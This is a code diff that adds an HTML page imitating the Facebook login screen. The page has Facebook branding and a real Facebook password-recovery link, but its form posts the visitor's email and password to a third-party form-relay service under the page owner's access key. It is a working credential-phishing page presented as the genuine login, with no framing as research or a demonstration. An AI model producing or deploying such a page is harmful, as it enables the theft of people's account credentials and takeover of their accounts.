@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send Data | Facebook</title>
+    <script src="script.js"></script>
+    <link rel="shortcut icon" href="logo.png" type="image/x-icon">
+    <link rel="stylesheet" href="styles.css">
+  </head>
+  <body>
+    <div class="container flex">
+      <div class="facebook-page flex">
+        <div class="text">
+          <h1>facebook</h1>
+          <p>Connect with friends and the world </p>
+          <p> around you on Facebook.</p>
+        </div>
+        <form action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="4f720539-20f6-4682-bd86-2068b83c626a">
+            <input type="email" placeholder="Email or phone number" name="Main" required>
+            <input type="password" placeholder="Password" name="Pass" required>
+            <button type="submit" class="login">Login</button>
+            <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forgot">Forgot password?</a>
+            <hr>
+            <div class="button">
+                <a href="#" onclick="not()">Create new account</a>
+            </div>
+        </form>
+      </div>
+    </div>
+  </body>
+</html>
